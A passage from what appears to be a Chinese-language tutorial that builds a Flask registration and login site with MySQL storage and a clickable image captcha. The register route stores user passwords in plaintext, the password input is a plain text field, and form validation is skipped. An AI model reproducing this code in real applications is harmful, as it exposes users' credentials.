punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>regist wenyan.online<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>CSS/base.css<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top_center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top_logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>IMAGE/logo.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top_word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    register wenyan.onlie                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_main_center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_first<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_first_word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        Username or Email                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_second<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_third<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_first_word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        Password                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_fourth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>passwd<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_third<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_first_word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        Phone                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_fourth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Phone<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Phone<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_seventh<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_seventh_button<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Regist<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_foot<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_foot_main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_eighth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_eighth_word1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        New to  wenyan.online                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_eighth_word2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Create an account<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>修改<code>app.py</code>中的注册逻辑,实现点击<code>regist</code>能成功写入到<code>mysql</code>数据.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py 添加修改</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        passwd <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'passwd'</span><span class="token punctuation">)</span>        phone <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'phone'</span><span class="token punctuation">)</span>        User <span class="token operator">=</span> Demo_Login_Users<span class="token punctuation">(</span>name<span class="token operator">=</span>user<span class="token punctuation">,</span> phone<span class="token operator">=</span>phone<span class="token punctuation">,</span> password<span class="token operator">=</span> passwd<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>User<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/success/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login_success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'loginSuccess.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Success<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3;url<span class="token punctuation">=</span>http://192.168.0.110:8080<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>CSS/base.css<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top_center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top_logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>IMAGE/logo.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top_word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            welcome to wenyan.onlie        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_main_center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_success_word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            Register Successful        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-css"><code class="language-css"><span class="token comment" spellcheck="true">/* base.css 添加 */</span> <span class="token selector"><span class="token class">.div_success_word</span></span><span class="token punctuation">{</span>    <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">48</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="8-修改跳转"><a href="#8-修改跳转" class="headerlink" title="8.修改跳转"></a>8.修改跳转</h3><blockquote><p>修改<code>login.html</code>的注册跳转</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_eighth_word2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>register<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Create an account<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="9-实现双击验证码更换和flush更换验证码"><a href="#9-实现双击验证码更换和flush更换验证码" class="headerlink" title="9.实现双击验证码更换和flush更换验证码"></a>9.实现双击验证码更换和<code>flush</code>更换验证码</h3><blockquote><p>图片验证码我们做了一个函数<code>graph_captcha</code>在蓝图中,可以通过网页访问<code>http://192.168.0.110:8080/common/graph_capture/</code> 得到验证码,而且每访问一次得到的验证码都是不同的.</p><p>按照这个原理,我们可以使用<code>JavaScript</code>点击图片访问新的<code>http://192.168.0.110:8080/common/graph_capture/?xxx</code>网址来生成新验证码.</p><hr><p>新建一个<code>JavaScript</code>文件<code>static/JS/base.js</code>.</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#ver_code'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> <span class="token string">"/common/graph_capture/"</span> <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flush'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#ver_code'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> <span class="token string">"/common/graph_capture/"</span> <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>login.html</code>中引入<code>base.js</code></p><pre class="line-numbers language-html"><code class="language-html">/* jquery 必须先引入,自上而下执行 */<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>JS/base.js<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="10-实现sign-in"><a href="#10-实现sign-in" class="headerlink" title="10.实现sign in"></a>10.实现<code>sign in</code></h3><blockquote><p>验证逻辑:</p><ul><li><code>temp.json</code>中的数据和前台接收的<code>code</code>匹配.(忽视大小写)</li><li>检查在<code>MySQL</code>中拥有账户</li><li>因为没有学习<code>Form</code>表单,所以先忽视表单验证.</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span 